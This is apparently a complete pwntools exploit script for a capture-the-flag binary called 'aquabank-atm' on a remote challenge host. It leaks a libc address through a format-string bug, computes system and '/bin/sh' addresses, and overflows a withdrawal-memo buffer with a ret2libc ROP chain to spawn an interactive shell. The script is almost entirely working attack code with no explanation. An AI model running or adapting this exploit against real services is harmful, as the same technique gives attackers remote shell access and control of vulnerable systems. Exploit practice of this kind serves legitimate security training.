# !/usr/bin/env python3
from pwn import *

exe = elf = ELF('./aquabank-atm', checksec=False)
context.binary = exe
context.os = 'linux'
context.arch = 'amd64'

HOST, PORT = 'offsec.m0lecon.it', 13519

OFFSET_TO_RIP = 136
ret_gadget = 0x40101a


def conn():
    if args.LOCAL:
        r = process(elf.path)
        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    else:
        r = remote(HOST, PORT)
        libc = ELF('libc.so.6', checksec=False)
    return r, libc


def main():
    p, libc = conn()

    # --- Leak libc ---
    payload_printf = b"%1$p"

    p.recvuntil(b'> ')
    p.sendline(b"1")
    p.recvuntil(b'Type your customer note: ')
    p.sendline(payload_printf)

    p.recvuntil(b'> ')
    p.sendline(b"2")
    p.recvuntil(b'--- Your customer note ---\n')

    leaked = p.recvline().strip()
    log.info(f"raw leak = {leaked}")

    leaked_addr = int(leaked, 16)
    log.info(f"leaked addr = {leaked_addr:#x}")

    SYMBOL_OFFSET = libc.symbols['_IO_2_1_stdout_'] + 131
    libc.address = leaked_addr - SYMBOL_OFFSET
    log.info(f"libc base = {libc.address:#x}")

    system_addr = libc.symbols['system']
    log.info(f"system = {system_addr:#x}")

    bin_sh_addr = next(libc.search(b"/bin/sh\x00"))
    log.info(f"/bin/sh = {bin_sh_addr:#x}")

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    log.info(f"pop rdi; ret = {pop_rdi:#x}")

    # --- Buffer overflow ---
    p.recvuntil(b'> ')
    p.sendline(b"3")
    p.recvuntil(b'From account: ')
    p.sendline(b"A")
    p.recvuntil(b'Amount: ')
    p.sendline(b"1")
    p.recvuntil(b'Withdrawal memo (be brief):')

    payload_bof = flat(
        b"A" * OFFSET_TO_RIP,
        pop_rdi,
        bin_sh_addr,
        ret_gadget,  # align the stack
        system_addr)

    p.sendline(payload_bof)
    # p.recvuntil(b'> ')

    p.interactive()


if __name__ == "__main__":
    main()